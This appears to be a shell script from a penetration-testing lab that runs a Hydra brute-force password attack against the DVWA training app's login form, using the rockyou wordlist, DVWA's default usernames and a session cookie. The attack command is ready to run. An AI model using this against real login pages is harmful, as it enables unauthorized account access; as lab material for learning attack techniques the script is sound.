#!/usr/bin/env bash
# Phase 1 brute force against the DVWA Brute Force page (security=low).
# Usage: ./scripts/40-brute.sh <PHPSESSID>
# Get PHPSESSID from your browser devtools (Application/Storage -> Cookies)
# after logging into DVWA, OR run ./scripts/get-session.sh to fetch one.
set -euo pipefail
cd "$(dirname "$0")/.."
source lab.env
SID="${1:?Pass your DVWA PHPSESSID:  ./scripts/40-brute.sh <PHPSESSID>}"

# Pick a password list: use Kali's rockyou if present, else the bundled list.
PWLIST=""
for cand in /usr/share/wordlists/rockyou.txt /usr/share/wordlists/rockyou.txt.gz \
            ./wordlists/passwords-common.txt; do
  if [ -f "$cand" ]; then
    case "$cand" in
      *.gz) gunzip -kf "$cand" 2>/dev/null || true; PWLIST="${cand%.gz}" ;;
      *)    PWLIST="$cand" ;;
    esac
    [ -f "$PWLIST" ] && break
  fi
done
echo "[*] Password list: $PWLIST"

printf 'admin\ngordonb\n1337\npablo\nsmithy\n' > out_users.txt

# hydra v9.x syntax (macOS Homebrew build):
#   - use the  service://host:port/  URL form (the positional form is flaky)
#   - the fail condition (F=) must come LAST, AFTER optional params like H=
#   - escape the colon inside the Cookie header as  \:
hydra -L out_users.txt -P "$PWLIST" \
  "http-get-form://$RHOST:$RPORT/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=$SID; security=low:F=incorrect"
